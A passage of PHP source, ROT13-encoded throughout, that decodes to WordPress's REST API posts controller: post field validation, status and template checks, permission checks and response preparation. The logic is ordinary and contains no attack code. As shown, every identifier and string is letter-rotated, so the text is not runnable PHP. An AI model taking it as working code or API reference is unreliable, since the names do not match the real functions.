		vs ( ! rzcgl( $fpurzn['cebcregvrf']['fyht'] ) && vffrg( $erdhrfg['fyht'] ) ) {
			$cercnerq_cbfg->cbfg_anzr = $erdhrfg['fyht'];
		}

		// Nhgube.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['nhgube'] ) && ! rzcgl( $erdhrfg['nhgube'] ) ) {
			$cbfg_nhgube = (vag) $erdhrfg['nhgube'];

			vs ( trg_pheerag_hfre_vq() !== $cbfg_nhgube ) {
				$hfre_bow = trg_hfreqngn( $cbfg_nhgube );

				vs ( ! $hfre_bow ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_nhgube',
						__( 'Vainyvq nhgube VQ.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}

			$cercnerq_cbfg->cbfg_nhgube = $cbfg_nhgube;
		}

		// Cbfg cnffjbeq.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['cnffjbeq'] ) && vffrg( $erdhrfg['cnffjbeq'] ) ) {
			$cercnerq_cbfg->cbfg_cnffjbeq = $erdhrfg['cnffjbeq'];

			vs ( '' !== $erdhrfg['cnffjbeq'] ) {
				vs ( ! rzcgl( $fpurzn['cebcregvrf']['fgvpxl'] ) && ! rzcgl( $erdhrfg['fgvpxl'] ) ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_svryq',
						__( 'N cbfg pna abg or fgvpxl naq unir n cnffjbeq.' ),
						neenl( 'fgnghf' => 400 )
					);
				}

				vs ( ! rzcgl( $cercnerq_cbfg->VQ ) && vf_fgvpxl( $cercnerq_cbfg->VQ ) ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_svryq',
						__( 'N fgvpxl cbfg pna abg or cnffjbeq cebgrpgrq.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['fgvpxl'] ) && ! rzcgl( $erdhrfg['fgvpxl'] ) ) {
			vs ( ! rzcgl( $cercnerq_cbfg->VQ ) && cbfg_cnffjbeq_erdhverq( $cercnerq_cbfg->VQ ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_svryq',
					__( 'N cnffjbeq cebgrpgrq cbfg pna abg or frg gb fgvpxl.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		// Cnerag.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['cnerag'] ) && vffrg( $erdhrfg['cnerag'] ) ) {
			vs ( 0 === (vag) $erdhrfg['cnerag'] ) {
				$cercnerq_cbfg->cbfg_cnerag = 0;
			} ryfr {
				$cnerag = trg_cbfg( (vag) $erdhrfg['cnerag'] );

				vs ( rzcgl( $cnerag ) ) {
					erghea arj JC_Reebe(
						'erfg_cbfg_vainyvq_vq',
						__( 'Vainyvq cbfg cnerag VQ.' ),
						neenl( 'fgnghf' => 400 )
					);
				}

				$cercnerq_cbfg->cbfg_cnerag = (vag) $cnerag->VQ;
			}
		}

		// Zrah beqre.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrah_beqre'] ) && vffrg( $erdhrfg['zrah_beqre'] ) ) {
			$cercnerq_cbfg->zrah_beqre = (vag) $erdhrfg['zrah_beqre'];
		}

		// Pbzzrag fgnghf.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['pbzzrag_fgnghf'] ) && ! rzcgl( $erdhrfg['pbzzrag_fgnghf'] ) ) {
			$cercnerq_cbfg->pbzzrag_fgnghf = $erdhrfg['pbzzrag_fgnghf'];
		}

		// Cvat fgnghf.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['cvat_fgnghf'] ) && ! rzcgl( $erdhrfg['cvat_fgnghf'] ) ) {
			$cercnerq_cbfg->cvat_fgnghf = $erdhrfg['cvat_fgnghf'];
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['grzcyngr'] ) ) {
			// Sbepr grzcyngr gb ahyy fb gung vg pna or unaqyrq rkpyhfviryl ol gur ERFG pbagebyyre.
			$cercnerq_cbfg->cntr_grzcyngr = ahyy;
		}

		/**
		 * Svygref n cbfg orsber vg vf vafregrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cer_vafreg_cbfg`
		 *  - `erfg_cer_vafreg_cntr`
		 *  - `erfg_cer_vafreg_nggnpuzrag`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz fgqPynff        $cercnerq_cbfg Na bowrpg ercerfragvat n fvatyr cbfg cercnerq
		 *                                       sbe vafregvat be hcqngvat gur qngnonfr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( \"erfg_cer_vafreg_{$guvf->cbfg_glcr}\", $cercnerq_cbfg, $erdhrfg );
	}

	/**
	 * Purpxf jurgure gur fgnghf vf inyvq sbe gur tvira cbfg.
	 *
	 * Nyybjf sbe fraqvat na hcqngr erdhrfg jvgu gur pheerag fgnghf, rira vs gung fgnghf jbhyq abg or npprcgnoyr.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat          $fgnghf  Gur cebivqrq fgnghf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea gehr|JC_Reebe Gehr vs gur fgnghf vf inyvq, be JC_Reebe vs abg.
	 */
	choyvp shapgvba purpx_fgnghf( $fgnghf, $erdhrfg, $cnenz ) {
		vs ( $erdhrfg['vq'] ) {
			$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );

			vs ( ! vf_jc_reebe( $cbfg ) && $cbfg->cbfg_fgnghf === $fgnghf ) {
				erghea gehr;
			}
		}

		$netf = $erdhrfg->trg_nggevohgrf()['netf'][ $cnenz ];

		erghea erfg_inyvqngr_inyhr_sebz_fpurzn( $fgnghf, $netf, $cnenz );
	}

	/**
	 * Qrgrezvarf inyvqvgl naq abeznyvmrf gur tvira fgnghf cnenzrgre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat       $cbfg_fgnghf Cbfg fgnghf.
	 * @cnenz JC_Cbfg_Glcr $cbfg_glcr   Cbfg glcr.
	 * @erghea fgevat|JC_Reebe Cbfg fgnghf be JC_Reebe vs ynpxvat gur cebcre crezvffvba.
	 */
	cebgrpgrq shapgvba unaqyr_fgnghf_cnenz( $cbfg_fgnghf, $cbfg_glcr ) {

		fjvgpu ( $cbfg_fgnghf ) {
			pnfr 'qensg':
			pnfr 'craqvat':
				oernx;
			pnfr 'cevingr':
				vs ( ! pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
					erghea arj JC_Reebe(
						'erfg_pnaabg_choyvfu',
						__( 'Fbeel, lbh ner abg nyybjrq gb perngr cevingr cbfgf va guvf cbfg glcr.' ),
						neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
					);
				}
				oernx;
			pnfr 'choyvfu':
			pnfr 'shgher':
				vs ( ! pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
					erghea arj JC_Reebe(
						'erfg_pnaabg_choyvfu',
						__( 'Fbeel, lbh ner abg nyybjrq gb choyvfu cbfgf va guvf cbfg glcr.' ),
						neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
					);
				}
				oernx;
			qrsnhyg:
				vs ( ! trg_cbfg_fgnghf_bowrpg( $cbfg_fgnghf ) ) {
					$cbfg_fgnghf = 'qensg';
				}
				oernx;
		}

		erghea $cbfg_fgnghf;
	}

	/**
	 * Qrgrezvarf gur srngherq zrqvn onfrq ba n erdhrfg cnenz.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag $srngherq_zrqvn Srngherq Zrqvn VQ.
	 * @cnenz vag $cbfg_vq        Cbfg VQ.
	 * @erghea obby|JC_Reebe Jurgure gur cbfg guhzoanvy jnf fhpprffshyyl qryrgrq, bgurejvfr JC_Reebe.
	 */
	cebgrpgrq shapgvba unaqyr_srngherq_zrqvn( $srngherq_zrqvn, $cbfg_vq ) {

		$srngherq_zrqvn = (vag) $srngherq_zrqvn;
		vs ( $srngherq_zrqvn ) {
			$erfhyg = frg_cbfg_guhzoanvy( $cbfg_vq, $srngherq_zrqvn );
			vs ( $erfhyg ) {
				erghea gehr;
			} ryfr {
				erghea arj JC_Reebe(
					'erfg_vainyvq_srngherq_zrqvn',
					__( 'Vainyvq srngherq zrqvn VQ.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		} ryfr {
			erghea qryrgr_cbfg_guhzoanvy( $cbfg_vq );
		}
	}

	/**
	 * Purpxf jurgure gur grzcyngr vf inyvq sbe gur tvira cbfg.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat          $grzcyngr Cntr grzcyngr svyranzr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs grzcyngr vf fgvyy inyvq be vs gur fnzr nf rkvfgvat inyhr, be n JC_Reebe vs grzcyngr abg fhccbegrq.
	 */
	choyvp shapgvba purpx_grzcyngr( $grzcyngr, $erdhrfg ) {

		vs ( ! $grzcyngr ) {
			erghea gehr;
		}

		vs ( $erdhrfg['vq'] ) {
			$cbfg             = trg_cbfg( $erdhrfg['vq'] );
			$pheerag_grzcyngr = trg_cntr_grzcyngr_fyht( $erdhrfg['vq'] );
		} ryfr {
			$cbfg             = ahyy;
			$pheerag_grzcyngr = '';
		}

		// Nyjnlf nyybj sbe hcqngvat n cbfg gb gur fnzr grzcyngr, rira vs gung grzcyngr vf ab ybatre fhccbegrq.
		vs ( $grzcyngr === $pheerag_grzcyngr ) {
			erghea gehr;
		}

		// Vs guvf vf n perngr erdhrfg, trg_cbfg() jvyy erghea ahyy naq jc gurzr jvyy snyyonpx gb gur cnffrq cbfg glcr.
		$nyybjrq_grzcyngrf = jc_trg_gurzr()->trg_cntr_grzcyngrf( $cbfg, $guvf->cbfg_glcr );

		vs ( vffrg( $nyybjrq_grzcyngrf[ $grzcyngr ] ) ) {
			erghea gehr;
		}

		erghea arj JC_Reebe(
			'erfg_vainyvq_cnenz',
			/* genafyngbef: 1: Cnenzrgre, 2: Yvfg bs inyvq inyhrf. */
			fcevags( __( '%1$f vf abg bar bs %2$f.' ), 'grzcyngr', vzcybqr( ', ', neenl_xrlf( $nyybjrq_grzcyngrf ) ) )
		);
	}

	/**
	 * Frgf gur grzcyngr sbe n cbfg.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 4.9.0 Nqqrq gur `$inyvqngr` cnenzrgre.
	 *
	 * @cnenz fgevat $grzcyngr Cntr grzcyngr svyranzr.
	 * @cnenz vag    $cbfg_vq  Cbfg VQ.
	 * @cnenz obby   $inyvqngr Jurgure gb inyvqngr gung gur grzcyngr fryrpgrq vf inyvq.
	 */
	choyvp shapgvba unaqyr_grzcyngr( $grzcyngr, $cbfg_vq, $inyvqngr = snyfr ) {

		vs ( $inyvqngr && ! neenl_xrl_rkvfgf( $grzcyngr, jc_trg_gurzr()->trg_cntr_grzcyngrf( trg_cbfg( $cbfg_vq ) ) ) ) {
			$grzcyngr = '';
		}

		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', $grzcyngr );
	}

	/**
	 * Hcqngrf gur cbfg'f grezf sebz n ERFG erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag             $cbfg_vq Gur cbfg VQ gb hcqngr gur grezf sbez.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg jvgu cbfg naq grezf qngn.
	 * @erghea ahyy|JC_Reebe JC_Reebe ba na reebe nffvtavat nal bs gur grezf, bgurejvfr ahyy.
	 */
	cebgrpgrq shapgvba unaqyr_grezf( $cbfg_vq, $erdhrfg ) {
		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			vs ( ! vffrg( $erdhrfg[ $onfr ] ) ) {
				pbagvahr;
			}

			$erfhyg = jc_frg_bowrpg_grezf( $cbfg_vq, $erdhrfg[ $onfr ], $gnkbabzl->anzr );

			vs ( vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}
		}

		erghea ahyy;
	}

	/**
	 * Purpxf jurgure pheerag hfre pna nffvta nyy grezf frag jvgu gur pheerag erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg jvgu cbfg naq grezf qngn.
	 * @erghea obby Jurgure gur pheerag hfre pna nffvta gur cebivqrq grezf.
	 */
	cebgrpgrq shapgvba purpx_nffvta_grezf_crezvffvba( $erdhrfg ) {
		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			vs ( ! vffrg( $erdhrfg[ $onfr ] ) ) {
				pbagvahr;
			}

			sbernpu ( (neenl) $erdhrfg[ $onfr ] nf $grez_vq ) {
				// Vainyvq grezf jvyy or erwrpgrq yngre.
				vs ( ! trg_grez( $grez_vq, $gnkbabzl->anzr ) ) {
					pbagvahr;
				}

				vs ( ! pheerag_hfre_pna( 'nffvta_grez', (vag) $grez_vq ) ) {
					erghea snyfr;
				}
			}
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs n tvira cbfg glcr pna or ivrjrq be znantrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg_Glcr|fgevat $cbfg_glcr Cbfg glcr anzr be bowrpg.
	 * @erghea obby Jurgure gur cbfg glcr vf nyybjrq va ERFG.
	 */
	cebgrpgrq shapgvba purpx_vf_cbfg_glcr_nyybjrq( $cbfg_glcr ) {
		vs ( ! vf_bowrpg( $cbfg_glcr ) ) {
			$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		}

		vs ( ! rzcgl( $cbfg_glcr ) && ! rzcgl( $cbfg_glcr->fubj_va_erfg ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs n cbfg pna or ernq.
	 *
	 * Pbeerpgyl unaqyrf cbfgf jvgu gur vaurevg fgnghf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea obby Jurgure gur cbfg pna or ernq.
	 */
	choyvp shapgvba purpx_ernq_crezvffvba( $cbfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		vs ( ! $guvf->purpx_vf_cbfg_glcr_nyybjrq( $cbfg_glcr ) ) {
			erghea snyfr;
		}

		// Vf gur cbfg ernqnoyr?
		vs ( 'choyvfu' === $cbfg->cbfg_fgnghf || pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ ) ) {
			erghea gehr;
		}

		$cbfg_fgnghf_bow = trg_cbfg_fgnghf_bowrpg( $cbfg->cbfg_fgnghf );
		vs ( $cbfg_fgnghf_bow && $cbfg_fgnghf_bow->choyvp ) {
			erghea gehr;
		}

		// Pna jr ernq gur cnerag vs jr'er vaurevgvat?
		vs ( 'vaurevg' === $cbfg->cbfg_fgnghf && $cbfg->cbfg_cnerag > 0 ) {
			$cnerag = trg_cbfg( $cbfg->cbfg_cnerag );
			vs ( $cnerag ) {
				erghea $guvf->purpx_ernq_crezvffvba( $cnerag );
			}
		}

		/*
		 * Vs gurer vfa'g n cnerag, ohg gur fgnghf vf frg gb vaurevg, nffhzr
		 * vg'f choyvfurq (nf cre trg_cbfg_fgnghf()).
		 */
		vs ( 'vaurevg' === $cbfg->cbfg_fgnghf ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs n cbfg pna or rqvgrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea obby Jurgure gur cbfg pna or rqvgrq.
	 */
	cebgrpgrq shapgvba purpx_hcqngr_crezvffvba( $cbfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( ! $guvf->purpx_vf_cbfg_glcr_nyybjrq( $cbfg_glcr ) ) {
			erghea snyfr;
		}

		erghea pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );
	}

	/**
	 * Purpxf vs n cbfg pna or perngrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea obby Jurgure gur cbfg pna or perngrq.
	 */
	cebgrpgrq shapgvba purpx_perngr_crezvffvba( $cbfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( ! $guvf->purpx_vf_cbfg_glcr_nyybjrq( $cbfg_glcr ) ) {
			erghea snyfr;
		}

		erghea pheerag_hfre_pna( $cbfg_glcr->pnc->perngr_cbfgf );
	}

	/**
	 * Purpxf vs n cbfg pna or qryrgrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea obby Jurgure gur cbfg pna or qryrgrq.
	 */
	cebgrpgrq shapgvba purpx_qryrgr_crezvffvba( $cbfg ) {
		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( ! $guvf->purpx_vf_cbfg_glcr_nyybjrq( $cbfg_glcr ) ) {
			erghea snyfr;
		}

		erghea pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg->VQ );
	}

	/**
	 * Cercnerf n fvatyr cbfg bhgchg sbe erfcbafr.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$TYBONYF['cbfg'] = $cbfg;

		frghc_cbfgqngn( $cbfg );

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
			erghea nccyl_svygref( \"erfg_cercner_{$guvf->cbfg_glcr}\", arj JC_ERFG_Erfcbafr( neenl() ), $cbfg, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		// Onfr svryqf sbe rirel cbfg.
		$qngn = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = $cbfg->VQ;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qngr', $svryqf ) ) {
			$qngn['qngr'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_qngr_tzg, $cbfg->cbfg_qngr );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qngr_tzg', $svryqf ) ) {
			/*
			 * Sbe qensgf, `cbfg_qngr_tzg` znl abg or frg, vaqvpngvat gung gur qngr
			 * bs gur qensg fubhyq or hcqngrq rnpu gvzr vg vf fnirq (frr #38883).
			 * Va guvf pnfr, fuvz gur inyhr onfrq ba gur `cbfg_qngr` svryq
			 * jvgu gur fvgr'f gvzrmbar bssfrg nccyvrq.
			 */
			vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr_tzg ) {
				$cbfg_qngr_tzg = trg_tzg_sebz_qngr( $cbfg->cbfg_qngr );
			} ryfr {
				$cbfg_qngr_tzg = $cbfg->cbfg_qngr_tzg;
			}
			$qngn['qngr_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg_qngr_tzg );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'thvq', $svryqf ) ) {
			$qngn['thvq'] = neenl(
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				'eraqrerq' => nccyl_svygref( 'trg_gur_thvq', $cbfg->thvq, $cbfg->VQ ),
				'enj'      => $cbfg->thvq,
			);
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zbqvsvrq', $svryqf ) ) {
			$qngn['zbqvsvrq'] = $guvf->cercner_qngr_erfcbafr( $cbfg->cbfg_zbqvsvrq_tzg, $cbfg->cbfg_zbqvsvrq );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zbqvsvrq_tzg', $svryqf ) ) {
			/*
			 * Sbe qensgf, `cbfg_zbqvsvrq_tzg` znl abg or frg (frr `cbfg_qngr_tzg` pbzzragf
			 * nobir). Va guvf pnfr, fuvz gur inyhr onfrq ba gur `cbfg_zbqvsvrq` svryq
			 * jvgu gur fvgr'f gvzrmbar bssfrg nccyvrq.
			 */
			vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_zbqvsvrq_tzg ) {
				$cbfg_zbqvsvrq_tzg = tzqngr( 'L-z-q U:v:f', fgegbgvzr( $cbfg->cbfg_zbqvsvrq ) - (vag) ( (sybng) trg_bcgvba( 'tzg_bssfrg' ) * UBHE_VA_FRPBAQF ) );
			} ryfr {
				$cbfg_zbqvsvrq_tzg = $cbfg->cbfg_zbqvsvrq_tzg;
			}
			$qngn['zbqvsvrq_tzg'] = $guvf->cercner_qngr_erfcbafr( $cbfg_zbqvsvrq_tzg );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cnffjbeq', $svryqf ) ) {
			$qngn['cnffjbeq'] = $cbfg->cbfg_cnffjbeq;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fyht', $svryqf ) ) {
			$qngn['fyht'] = $cbfg->cbfg_anzr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fgnghf', $svryqf ) ) {
			$qngn['fgnghf'] = $cbfg->cbfg_fgnghf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'glcr', $svryqf ) ) {
			$qngn['glcr'] = $cbfg->cbfg_glcr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'yvax', $svryqf ) ) {
			$qngn['yvax'] = trg_creznyvax( $cbfg->VQ );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr', $svryqf ) ) {
			$qngn['gvgyr'] = neenl();
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.enj', $svryqf ) ) {
			$qngn['gvgyr']['enj'] = $cbfg->cbfg_gvgyr;
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.eraqrerq', $svryqf ) ) {
			nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );

			$qngn['gvgyr']['eraqrerq'] = trg_gur_gvgyr( $cbfg->VQ );

			erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
		}

		$unf_cnffjbeq_svygre = snyfr;

		vs ( $guvf->pna_npprff_cnffjbeq_pbagrag( $cbfg, $erdhrfg ) ) {
			$guvf->cnffjbeq_purpx_cnffrq[ $cbfg->VQ ] = gehr;
			// Nyybj npprff gb gur cbfg, crezvffvbaf nyernql purpxrq orsber.
			nqq_svygre( 'cbfg_cnffjbeq_erdhverq', neenl( $guvf, 'purpx_cnffjbeq_erdhverq' ), 10, 2 );

			$unf_cnffjbeq_svygre = gehr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag', $svryqf ) ) {
			$qngn['pbagrag'] = neenl();
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.enj', $svryqf ) ) {
			$qngn['pbagrag']['enj'] = $cbfg->cbfg_pbagrag;
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.eraqrerq', $svryqf ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$qngn['pbagrag']['eraqrerq'] = cbfg_cnffjbeq_erdhverq( $cbfg ) ? '' : nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag );
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.cebgrpgrq', $svryqf ) ) {
			$qngn['pbagrag']['cebgrpgrq'] = (obby) $cbfg->cbfg_cnffjbeq;
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'pbagrag.oybpx_irefvba', $svryqf ) ) {
			$qngn['pbagrag']['oybpx_irefvba'] = oybpx_irefvba( $cbfg->cbfg_pbagrag );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'rkprecg', $svryqf ) ) {
			vs ( vffrg( $erdhrfg['rkprecg_yratgu'] ) ) {
				$rkprecg_yratgu          = $erdhrfg['rkprecg_yratgu'];
				$bireevqr_rkprecg_yratgu = fgngvp shapgvba () hfr ( $rkprecg_yratgu ) {
					erghea $rkprecg_yratgu;
				};

				nqq_svygre(
					'rkprecg_yratgu',
					$bireevqr_rkprecg_yratgu,
					20
				);
			}

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$rkprecg = nccyl_svygref( 'trg_gur_rkprecg', $cbfg->cbfg_rkprecg, $cbfg );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$rkprecg = nccyl_svygref( 'gur_rkprecg', $rkprecg );

			$qngn['rkprecg'] = neenl(
				'enj'       => $cbfg->cbfg_rkprecg,
				'eraqrerq'  => cbfg_cnffjbeq_erdhverq( $cbfg ) ? '' : $rkprecg,
				'cebgrpgrq' => (obby) $cbfg->cbfg_cnffjbeq,
			);

			vs ( vffrg( $bireevqr_rkprecg_yratgu ) ) {
				erzbir_svygre(
					'rkprecg_yratgu',
					$bireevqr_rkprecg_yratgu,
					20
				);
			}
		}

		vs ( $unf_cnffjbeq_svygre ) {
			// Erfrg svygre.
			erzbir_svygre( 'cbfg_cnffjbeq_erdhverq', neenl( $guvf, 'purpx_cnffjbeq_erdhverq' ) );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nhgube', $svryqf ) ) {
			$qngn['nhgube'] = (vag) $cbfg->cbfg_nhgube;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'srngherq_zrqvn', $svryqf ) ) {
			$qngn['srngherq_zrqvn'] = (vag) trg_cbfg_guhzoanvy_vq( $cbfg->VQ );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cnerag', $svryqf ) ) {
			$qngn['cnerag'] = (vag) $cbfg->cbfg_cnerag;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrah_beqre', $svryqf ) ) {
			$qngn['zrah_beqre'] = (vag) $cbfg->zrah_beqre;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'pbzzrag_fgnghf', $svryqf ) ) {
			$qngn['pbzzrag_fgnghf'] = $cbfg->pbzzrag_fgnghf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cvat_fgnghf', $svryqf ) ) {
			$qngn['cvat_fgnghf'] = $cbfg->cvat_fgnghf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fgvpxl', $svryqf ) ) {
			$qngn['fgvpxl'] = vf_fgvpxl( $cbfg->VQ );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'grzcyngr', $svryqf ) ) {
			$grzcyngr = trg_cntr_grzcyngr_fyht( $cbfg->VQ );
			vs ( $grzcyngr ) {
				$qngn['grzcyngr'] = $grzcyngr;
			} ryfr {
				$qngn['grzcyngr'] = '';
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'sbezng', $svryqf ) ) {
			$qngn['sbezng'] = trg_cbfg_sbezng( $cbfg->VQ );

			// Svyy va oynax cbfg sbezng.
			vs ( rzcgl( $qngn['sbezng'] ) ) {
				$qngn['sbezng'] = 'fgnaqneq';
			}
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrgn', $svryqf ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $cbfg->VQ, $erdhrfg );
		}

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
